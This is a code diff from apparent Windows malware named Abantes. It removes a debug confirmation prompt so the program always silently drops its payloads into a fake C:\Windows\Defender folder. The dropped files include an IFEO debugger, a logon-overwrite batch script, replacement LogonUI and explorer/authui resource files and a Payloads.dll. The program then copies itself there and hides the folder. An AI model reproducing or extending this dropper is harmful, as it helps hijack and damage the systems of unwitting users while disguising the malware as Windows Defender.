@@ -37,51 +37,25 @@ namespace Abantes
 
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "AbantesWasHere", null) == null)
             {
-                if (MainThread.Mode == 1)
-                {
-                    if (MessageBox.Show("EXTRACT RESOURCES?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
-                    {
-                        Directory.CreateDirectory(@"C:\Windows\Defender");
-                        File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
-                        File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
-                        File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
-                        File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
-                        File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
-                        File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
-                        File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
-                        File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
-                        File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
-                        File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
-                        File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
-                        File.WriteAllBytes(extractPath + "\\data.bin", Resources.data);
-                        Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
-                        File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
+                Directory.CreateDirectory(@"C:\Windows\Defender");
+                File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
+                File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
+                File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
+                File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
+                File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
+                File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
+                File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
+                File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
+                File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
+                File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
+                File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
+                File.WriteAllBytes(extractPath + "\\data.bin", Resources.data);
+                Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
+                File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
-                        DirectoryInfo ch = new DirectoryInfo(extractPath);
-                        ch.Attributes = FileAttributes.Hidden;
-                    }
-                }
-                else
-                {
-                    Directory.CreateDirectory(@"C:\Windows\Defender");
-                    File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
-                    File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
-                    File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
-                    File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
-                    File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
-                    File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
-                    File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
-                    File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
-                    File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
-                    File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
-                    File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
-                    File.WriteAllBytes(extractPath + "\\data.bin", Resources.data);
-                    Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
-                    File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
-
-                    DirectoryInfo ch = new DirectoryInfo(extractPath);
-                    ch.Attributes = FileAttributes.Hidden;
-                }
+                DirectoryInfo ch = new DirectoryInfo(extractPath);
+                ch.Attributes = FileAttributes.Hidden;
+                
 
                 Wallpaper.Set(new Uri(extractPath + @"\wallpaper.jpg"), Wallpaper.Style.Stretched);
 
